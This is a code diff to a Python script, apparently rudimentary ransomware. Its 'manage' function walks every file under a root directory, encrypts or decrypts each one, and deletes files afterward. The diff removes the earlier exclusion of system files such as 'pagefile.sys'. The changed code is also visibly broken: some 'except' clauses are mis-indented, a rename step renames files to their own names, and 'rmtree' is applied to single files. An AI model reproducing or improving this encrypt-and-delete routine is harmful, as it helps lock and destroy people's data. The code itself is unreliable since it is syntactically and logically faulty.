@@ -83,16 +83,32 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
     
     for subdir, dirs, files in os.walk(rootDirectionary):
         for file in files:
-            filename = os.path.join(subdir, file)
-            if not "pagefile.sys" in filename and not "$" in filename:
-                
+           
+            try:
+                filename = os.path.join(subdir, file)
+                newFile = file
+                newFile += "a"    
+                newFilename = os.path.join(subdir, file)
+                os.rename(filename, newFilename)
                 print(filename)
+                
                 if function == 0:    
                     encrypt_file(key, filename, None, 64*1024)
+                    try: 
+                        if not ".enc" in filename:
+                            shutil.rmtree(filename)
+                        except OSError:
+                            print("cant delete :(")
                 elif function == 1:
-                     encrypt_file(key, filename, None, 64*1024)
-                
-                try: 
-                    shutil.rmtree(filename)
-                except OSError:
-                    print("cant delete :(")           
+                    decrypt_file(key, filename, None, 64*1024)
+                    try: 
+                        if ".enc" in filename:
+                            shutil.rmtree(filename)
+                        except OSError:
+                            print("cant delete :(")
+                    
+            except IOError:
+                continue    
+            
+                    
+                           
